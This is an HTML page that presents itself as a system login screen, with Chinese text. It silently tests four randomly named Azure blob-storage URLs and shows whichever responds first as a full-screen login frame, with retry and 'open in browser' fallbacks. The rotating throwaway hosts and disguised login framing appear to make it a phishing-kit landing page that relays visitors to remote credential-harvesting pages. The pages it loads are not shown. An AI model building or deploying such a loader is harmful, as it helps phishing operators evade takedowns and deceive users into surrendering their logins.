<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>系统登录中...</title>
  <style>
    html, body {
      margin: 0; padding: 0;
      font-family: "Segoe UI", sans-serif;
      background: #f9f9fb;
      display: flex; flex-direction: column;
      justify-content: center; align-items: center;
      height: 100vh;
      text-align: center;
    }
    #message {
      margin-top: 20px;
      font-size: 17px;
    }
    #loginFrame {
      width: 100%; height: 100vh;
      border: none;
      display: none;
    }
    #fallback, #retryBtn {
      display: none;
      margin-top: 20px;
    }
    button {
      padding: 10px 20px;
      font-size: 16px;
      background: #0078d4;
      color: white;
      border: none;
      border-radius: 6px;
    }
  </style>
</head>
<body>

  <div id="message">正在检测可用登录入口...</div>
  <iframe id="loginFrame"></iframe>

  <div id="fallback">
    <div style="margin-top:10px;">如果页面没有响应，请在浏览器中打开：</div>
    <button onclick="openExternal()">在浏览器中打开</button>
  </div>

  <button id="retryBtn" onclick="start()">重新尝试</button>

  <script>
    const urls = [
      "https://iwtq25dhr.blob.core.windows.net/home/index.html",
      "https://fx4iug5qsp.blob.core.windows.net/home/index.html",
      "https://hjdkc8731miw.blob.core.windows.net/home/index.html",
      "https://x93yv2cak5w8.z48.web.core.windows.net/home/index.html"
    ];
    const timeout = 4000;
    let fallbackUrl = "";

    function tryUrl(url, onSuccess, onFailure) {
      const iframe = document.createElement("iframe");
      iframe.style.display = "none";
      iframe.src = url;
      document.body.appendChild(iframe);

      const timer = setTimeout(() => {
        document.body.removeChild(iframe);
        onFailure();
      }, timeout);

      iframe.onload = () => {
        clearTimeout(timer);
        document.body.removeChild(iframe);
        onSuccess(url);
      };
    }

    function tryNext(index) {
      if (index >= urls.length) {
        document.getElementById("message").innerText = "系统维护中，暂时无法登录。";
        document.getElementById("retryBtn").style.display = "inline-block";
        return;
      }

      tryUrl(
        urls[index],
        (url) => {
          fallbackUrl = url;
          showLoginFrame(url);
        },
        () => {
          tryNext(index + 1);
        }
      );
    }

    function showLoginFrame(url) {
      const iframe = document.getElementById("loginFrame");
      iframe.src = url;
      iframe.style.display = "block";
      document.getElementById("message").innerText = "正在加载登录页面...";
      document.getElementById("fallback").style.display = "block";
    }

    function openExternal() {
      if (fallbackUrl) {
        window.open(fallbackUrl, '_blank');
      }
    }

    function start() {
      document.getElementById("retryBtn").style.display = "none";
      document.getElementById("message").innerText = "正在重新检测...";
      document.getElementById("loginFrame").style.display = "none";
      document.getElementById("fallback").style.display = "none";
      tryNext(0);
    }

    window.onload = start;
  </script>

</body>
</html>
